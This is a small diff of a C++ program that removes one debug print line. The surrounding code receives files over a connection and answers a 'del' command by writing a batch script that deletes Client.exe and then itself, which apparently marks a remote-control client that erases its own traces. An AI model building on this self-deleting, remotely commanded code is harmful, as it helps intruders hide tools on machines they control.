@@ -169,7 +169,6 @@ int main()
 				}
 			} while (bytesrec < filesize);
 			CloseHandle(hFile);
-			cout << bytesrec<<endl;
 		}
 		else if ((buff[0]=='d')&&(buff[1]=='e')&&(buff[2]=='l')) {
 			char delfile[] = "@echo off\n:loop\ndel Client.exe\nif exist 1.txt goto : loop\ndel %0";
